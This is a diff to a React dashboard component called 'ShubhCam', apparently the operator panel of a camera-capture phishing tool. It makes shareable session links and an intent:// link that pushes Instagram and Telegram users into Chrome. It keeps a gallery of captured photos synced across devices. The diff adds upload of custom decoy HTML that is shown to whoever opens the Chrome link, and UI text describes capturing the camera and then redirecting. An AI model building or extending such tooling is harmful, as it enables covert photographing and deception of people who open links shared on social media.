@@ -21,7 +21,9 @@ const ShubhCam = () => {
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [loading, setLoading] = useState(false);
   const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
+  const [chromeCustomHtml, setChromeCustomHtml] = useState(settings.chromeCustomHtml || "");
   const fileInputRef = useRef<HTMLInputElement>(null);
+  const chromeFileInputRef = useRef<HTMLInputElement>(null);
   
   // Use session ID and redirect URL from settings (synced across all devices via Supabase)
   const sessionId = settings.camSessionId || "shubhcam01";
@@ -31,6 +33,7 @@ const ShubhCam = () => {
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
   const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
+  const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
   
   // Chrome intent link for in-app browsers (Instagram, Telegram, etc.)
   const chromeIntentLink = `intent://${currentOrigin.replace(/^https?:\/\//, '')}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}#Intent;scheme=https;package=com.android.chrome;end`;
@@ -62,7 +65,8 @@ const ShubhCam = () => {
 
   useEffect(() => {
     setCustomHtml(settings.customCaptureHtml || "");
-  }, [settings.customCaptureHtml]);
+    setChromeCustomHtml(settings.chromeCustomHtml || "");
+  }, [settings.customCaptureHtml, settings.chromeCustomHtml]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -173,11 +177,35 @@ const ShubhCam = () => {
     }
   };
 
+  const handleChromeFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        const content = e.target?.result as string;
+        setChromeCustomHtml(content);
+        toast({
+          title: "Chrome HTML Uploaded",
+          description: "Chrome custom HTML loaded successfully",
+        });
+      };
+      reader.readAsText(file);
+    }
+  };
+
   const saveCustomHtml = () => {
     updateSettings({ customCaptureHtml: customHtml });
     toast({
       title: "Saved!",
       description: "Custom HTML saved and synced",
+    });
+  };
+
+  const saveChromeCustomHtml = () => {
+    updateSettings({ chromeCustomHtml: chromeCustomHtml });
+    toast({
+      title: "Saved!",
+      description: "Chrome custom HTML saved and synced",
     });
   };
 
@@ -377,7 +405,7 @@ const ShubhCam = () => {
               </li>
               <li className="flex items-start gap-2">
                 <span className="w-5 h-5 rounded-full bg-neon-green/20 text-neon-green text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">3</span>
-                <span>Chrome me camera capture hota hai</span>
+                <span>Chrome me custom HTML + camera capture</span>
               </li>
             </ol>
           </div>
@@ -388,52 +416,104 @@ const ShubhCam = () => {
             <span className="text-neon-orange font-mono font-bold tracking-wider">{sessionId}</span>
           </div>
 
-          {/* Normal Link (with built-in detection) */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
+          {/* Chrome Custom HTML Upload */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
             <div className="flex items-center gap-2 mb-3">
-              <span className="text-xl">✅</span>
-              <h3 className="text-neon-green font-bold tracking-wide text-sm">SMART LINK (Recommended)</h3>
+              <Code className="w-5 h-5 text-neon-pink" />
+              <h3 className="text-neon-pink font-bold tracking-wide text-sm">CHROME CUSTOM HTML</h3>
             </div>
             <p className="text-xs text-muted-foreground mb-3">
-              Ye link automatically in-app browser detect karke Chrome me redirect karta hai.
+              Upload custom HTML jo Instagram/Telegram se Chrome me open hoke dikhega.
+            </p>
+            
+            {/* File Upload */}
+            <input
+              type="file"
+              accept=".html,.htm"
+              ref={chromeFileInputRef}
+              onChange={handleChromeFileUpload}
+              className="hidden"
+            />
+            <Button
+              onClick={() => chromeFileInputRef.current?.click()}
+              variant="outline"
+              className="w-full border-neon-pink text-neon-pink hover:bg-neon-pink/10 mb-3"
+            >
+              <Upload className="w-4 h-4 mr-2" /> UPLOAD HTML FILE
+            </Button>
+
+            {/* HTML Textarea */}
+            <Textarea
+              value={chromeCustomHtml}
+              onChange={(e) => setChromeCustomHtml(e.target.value)}
+              placeholder="Paste your HTML code here..."
+              className="bg-input border-neon-pink/50 text-foreground font-mono text-xs min-h-[120px] mb-3"
+            />
+
+            {/* Save Button */}
+            <Button
+              onClick={saveChromeCustomHtml}
+              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
+            >
+              <Zap className="w-4 h-4 mr-2" /> SAVE CHROME HTML
+            </Button>
+          </div>
+
+          {/* Chrome Custom Capture Link */}
+          {chromeCustomHtml && (
+            <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
+              <div className="flex items-center gap-2 mb-3">
+                <span className="text-xl">🔗</span>
+                <h3 className="text-neon-green font-bold tracking-wide text-sm">CHROME CUSTOM LINK</h3>
+              </div>
+              <p className="text-xs text-muted-foreground mb-3">
+                Ye link Instagram/Telegram se Chrome me redirect karke custom HTML dikhayega.
+              </p>
+              <div className="flex gap-2 mb-3">
+                <Input
+                  value={chromeCustomCaptureLink}
+                  readOnly
+                  className="bg-background/50 border-neon-green/50 text-neon-green text-xs font-mono focus:border-neon-green focus:ring-neon-green/30"
+                />
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={() => copyToClipboard(chromeCustomCaptureLink)}
+                  className="border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] shrink-0 transition-all"
+                >
+                  <Copy className="w-4 h-4" />
+                </Button>
+              </div>
+              <Button
+                onClick={() => window.open(chromeCustomCaptureLink, '_blank')}
+                variant="outline"
+                className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
+              >
+                <ExternalLink className="w-4 h-4 mr-2" /> TEST CHROME LINK
+              </Button>
+            </div>
+          )}
+
+          {/* Normal Link (with built-in detection) */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="text-xl">✅</span>
+              <h3 className="text-neon-cyan font-bold tracking-wide text-sm">SMART LINK (No Custom HTML)</h3>
+            </div>
+            <p className="text-xs text-muted-foreground mb-3">
+              Standard link - capture karke redirect karta hai (custom HTML nahi dikhata).
             </p>
             <div className="flex gap-2">
               <Input
                 value={captureLink}
                 readOnly
-                className="bg-background/50 border-neon-green/50 text-neon-green text-xs font-mono focus:border-neon-green focus:ring-neon-green/30"
+                className="bg-background/50 border-neon-cyan/50 text-neon-cyan text-xs font-mono focus:border-neon-cyan focus:ring-neon-cyan/30"
               />
               <Button
                 variant="outline"
                 size="icon"
                 onClick={() => copyToClipboard(captureLink)}
-                className="border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] shrink-0 transition-all"
-              >
-                <Copy className="w-4 h-4" />
-              </Button>
-            </div>
-          </div>
-
-          {/* Direct Chrome Intent Link */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-orange/30">
-            <div className="flex items-center gap-2 mb-3">
-              <Chrome className="w-5 h-5 text-neon-orange" />
-              <h3 className="text-neon-orange font-bold tracking-wide text-sm">DIRECT CHROME INTENT</h3>
-            </div>
-            <p className="text-xs text-muted-foreground mb-3">
-              Android devices pe directly Chrome me open hoga (intent:// protocol use karta hai).
-            </p>
-            <div className="flex gap-2">
-              <Input
-                value={chromeIntentLink}
-                readOnly
-                className="bg-background/50 border-neon-orange/50 text-neon-orange text-xs font-mono focus:border-neon-orange focus:ring-neon-orange/30"
-              />
-              <Button
-                variant="outline"
-                size="icon"
-                onClick={() => copyToClipboard(chromeIntentLink)}
-                className="border-neon-orange text-neon-orange hover:bg-neon-orange/20 hover:shadow-[0_0_15px_hsl(var(--neon-orange)/0.4)] shrink-0 transition-all"
+                className="border-neon-cyan text-neon-cyan hover:bg-neon-cyan/20 hover:shadow-[0_0_15px_hsl(var(--neon-cyan)/0.4)] shrink-0 transition-all"
               >
                 <Copy className="w-4 h-4" />
               </Button>
@@ -449,27 +529,10 @@ const ShubhCam = () => {
                 <ul className="text-xs text-foreground/70 space-y-1">
                   <li>• Sirf Android devices pe kaam karta hai</li>
                   <li>• iOS/iPhone supported nahi hai</li>
-                  <li>• Non-Chrome browsers me message dikhega</li>
+                  <li>• Non-Chrome browsers me error message dikhega</li>
                 </ul>
               </div>
             </div>
-          </div>
-
-          {/* Redirect URL */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
-            <div className="flex items-center gap-2 mb-3">
-              <span className="text-xl">🔗</span>
-              <h3 className="text-neon-cyan font-bold tracking-wide text-sm">REDIRECT URL</h3>
-            </div>
-            <Input
-              value={redirectUrl}
-              onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
-              placeholder="https://google.com"
-              className="bg-background/50 border-neon-cyan/50 text-neon-cyan focus:border-neon-cyan focus:ring-neon-cyan/30"
-            />
-            <p className="text-neon-purple text-xs mt-3">
-              💡 Camera capture ke baad is URL pe redirect hoga
-            </p>
           </div>
         </div>
       ) : activeTab === "custom" ? (
